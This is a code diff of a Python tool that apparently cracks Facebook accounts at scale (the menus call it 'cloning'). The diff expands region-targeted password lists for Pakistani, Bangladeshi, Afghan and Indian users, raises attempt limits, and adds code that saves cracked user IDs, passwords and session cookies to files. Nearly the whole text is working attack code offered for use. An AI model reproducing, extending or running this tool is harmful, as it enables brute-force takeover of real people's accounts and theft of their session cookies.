@@ -461,18 +461,23 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345, 91904 ,  91766 ')
+		print('\033[1;35m Code example: 0306,0315,0335,0345, ')
+		linex()
+		print('\033[1;35m Code example: 91812 , 91904 , 91766 ')
+		linex()
+		print('\033[1;35m Code example: 0176 , 0195 , 0184 , 0142 ')
+		linex()
 		code = input('\033[1;37m put code: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 		except ValueError:
-			limit = 5000
+			limit = 50000
 		clear()
 		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (with cokies) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
 		linex()
 		mthd = input(' Choose: ')
 		clear()
-		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) ')
+		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) \n\033[1;32m [9] \033[1;33mClone with auto pass (only-IND) ')
 		linex()
 		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
@@ -488,20 +493,22 @@ def pak():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'57273200','59039200']
+					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
 				if pcs in ['2','02']:
-					passlist = [psx,ids,'57273200','59039200']
+					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
 				elif pcs in ['3','03']:
-					passlist = [psx,ids,'57273200','59039200']
+					passlist = [psx,ids,'pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234']
 				elif pcs in ['4','04']:
-					passlist = [psx,ids,'57273200','59039200']
+					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']
 				elif pcs in ['5','05']:
 					passlist = [psx,ids]
 				elif pcs in ['6','06']:
-					passlist = [psx,ids,'57273200','59039200']
+					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
 				elif pcs in ['7','07']:
-					passlist = [psx,ids,'57273200','59039200']
+					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
 				elif pcs in ['8','08']:
+					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
+				elif pcs in ['9','09']:
 					passlist = [psx,ids,'57273200','59039200']
 				if mthd in ['1','01']:
 					TRT.submit(trt1,ids,passlist)
@@ -523,8 +530,10 @@ def pak():
 		input(' Press enter to back ')
 		os.system('python trt.py')
 
+
+
 def gmail():
-		os.system('rm -rf .re.txt')
+		#os.system৳('rm -rf .re.txt')
 		clear()
 		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
 		linex()
@@ -541,7 +550,7 @@ def gmail():
 		try:
 			limit=int(input(' Put limit: '))
 		except ValueError:
-			limit = 5000
+			limit = 500
 		clear()
 		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
 		linex()
@@ -578,13 +587,13 @@ def gmail():
 				fs = first_name.lower()
 				ls = last_name.lower()
 				if pxc in ['1','01']:
-					passlist = [fs+ls,fs+' '+ls,fs]
+					passlist = [fs+ls,fs+' '+ls,fs,'57273200','59039200']
 				elif pxc in ['2','02']:
-					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
+					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122','57273200','59039200']
 				elif pxc in ['3','03']:
-					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
+					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123','57273200','59039200']
 				else:
-					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
+					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122','57273200','59039200']
 				if mthd in ['1','01']:
 					TRT.submit(trt1,ids,passlist)
 				if mthd in ['2','02']:
@@ -1576,7 +1585,7 @@ def trt4(ids,passlist):
                                         print('\r\r\033[1;32m [GS2X-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/GS2XM4-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/GS2XM4-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                         open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
